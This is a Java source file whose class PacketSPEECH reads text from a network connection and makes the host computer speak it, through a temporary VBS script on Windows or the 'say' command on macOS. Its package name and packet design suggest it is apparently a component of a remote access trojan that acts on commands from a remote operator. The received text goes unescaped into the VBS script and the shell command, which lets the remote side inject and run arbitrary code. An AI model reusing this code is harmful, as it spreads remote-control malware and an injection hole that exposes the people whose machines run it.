package com.redpois0n.packets;

import java.io.File;
import java.io.FileWriter;

import com.redpois0n.Connection;
import com.redpois0n.common.os.OperatingSystem;



public class PacketSPEECH extends Packet {

	@Override
	public void read(String line) throws Exception {
		final String speech = Connection.readLine();
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			new Thread() {
				public void run() {
					try {
						File f = File.createTempFile("speech", ".vbs");
						FileWriter writer = new FileWriter(f, false);
						writer.write("Dim message, sapi\n");
						writer.write("message = \"" + speech + "\"\n");
						writer.write("Set sapi = CreateObject(\"sapi.spvoice\")\n");
						writer.write("sapi.Speak message");
						writer.close();

						Process p = Runtime.getRuntime().exec(new String[] { "cscript", f.getAbsolutePath() });
						p.waitFor();
						f.delete();
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}
			}.start();
		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
			try {
				Runtime.getRuntime().exec("say " + speech);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
